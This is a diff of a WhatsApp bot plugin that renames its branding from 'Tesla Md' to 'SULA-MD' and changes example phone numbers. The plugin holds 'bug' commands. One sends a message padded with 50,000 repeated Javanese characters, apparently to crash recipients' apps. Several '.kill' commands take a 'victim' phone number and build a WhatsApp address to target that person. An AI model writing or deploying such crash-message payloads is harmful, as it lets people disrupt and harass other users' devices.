@@ -26,7 +26,7 @@ cmd({
     async (conn, mek, m,{ isOwner }) => {
         if(!isOwner) return m.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
         try {
-                const bug2 = `̿╮⭑ ☠️⃰͜͡؜ᴘᴏᴡᴇʀᴇᴅ ʙʏ Tᴇꜱʟᴀ Mᴅ╮.xp` + "ꦾ".repeat(50000);
+                const bug2 = `🄿🄾🅆🄴🅁🄳 🅱🆈 𝐒𝐔𝐋𝐀-𝐌𝐃 😈` + "ꦾ".repeat(50000);
                 await conn.sendMessage(m.chat, { text: bug2 }, { quoted: mek });
         } catch (error) {
             console.error("Error sending Bugtext message: ", error);
@@ -55,7 +55,7 @@ async (conn, mek, m,{ isOwner , q }) => {
         }
 let text = q;
         if (!text) {
-            return m.reply(`🫵🏽 add the number you want to bug after your command like this \n.kill 23769813xxxx`);
+            return m.reply(`🫵🏽 add the number you want to bug after your command like this \n.kill 9476066xxxx`);
         }
 
         const jid = m.chat; // JID of the recipient
@@ -70,7 +70,7 @@ let text = q;
         let victim = text.replace(/[^0-9]/g, "");
 
         if (victim.startsWith('+')) {
-            return m.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 23769813xxxx`);
+            return m.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 9476066xxxx`);
         }
 
         let ying = victim + '@s.whatsapp.net';
@@ -124,7 +124,7 @@ async (conn, mek, m, { isOwner,q  }) => {
         }
 let text =q
         if (!text) {
-            return m.reply(`🫵🏽 add the number you want to bug after your command like this \n.kill 23769813xxxx`);
+            return m.reply(`🫵🏽 add the number you want to bug after your command like this \n.kill 9476066xxxx`);
         }
 
         const jid = m.chat; // JID of the recipient
@@ -138,7 +138,7 @@ let text =q
         let victim = text.replace(/[^0-9]/g, "");
 
         if (victim.startsWith('+')) {
-            return m.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 23769813xxxx`);
+            return m.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 9476066xxxx`);
         }
 
         let ying = victim + '@s.whatsapp.net';
@@ -193,7 +193,7 @@ async (conn, mek, m,{ isOwner ,q}) => {
         }
 let text = q;
         if (!text) {
-            return m.reply(`🫵🏽 add the number you want to bug after your command like this \n.kill 23769813xxxx`);
+            return m.reply(`🫵🏽 add the number you want to bug after your command like this \n.kill 9476066xxxx`);
         }
 
         const jid = m.chat; // JID of the recipient
@@ -207,7 +207,7 @@ let text = q;
         let victim = text.replace(/[^0-9]/g, "");
 
         if (victim.startsWith('+')) {
-            return m.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 23769813xxxx`);
+            return m.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 9476066xxxx`);
         }
 
         let ying = victim + '@s.whatsapp.net';
